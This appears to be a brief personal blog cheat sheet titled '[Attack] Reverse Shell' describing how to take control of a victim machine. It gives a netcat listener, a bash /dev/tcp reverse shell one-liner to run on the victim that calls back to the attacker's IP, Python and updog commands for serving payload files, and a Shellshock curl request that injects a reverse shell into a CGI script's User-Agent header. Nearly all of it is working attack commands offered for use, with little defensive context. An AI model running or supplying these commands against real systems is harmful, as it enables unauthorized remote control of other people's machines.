---
title: "[Attack] Reverse Shell "
published: 2024-04-12
description: 'Basic reverse shell rundown for taking control'
tags: [Security, Attack]
category: Attack
draft: false
---

# [Attack] Reverse Shell 

https://www.revshells.com/

## usage

Listener (Your own machine):  
```bash
nc -lvnp 8081
```

Reverse (Victims):  
- `ip` : Your own machine.  
- `post`: Determine by your nc open port.    
```bash
sh -i >& /dev/tcp/192.168.49.54/8081 0>&1
```

## Web server feed

- With `python`
```bash
python3 -m http.server
python -m http.server 8123
```

- With `updog`
https://github.com/sc0tfree/updog
```bash
updog 
updog -p 1234
updog --ssl
```

## With `shellshock`  
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.86.99/443 0>&1' http://192.168.86.150/cgi-bin/test/test.cgi
```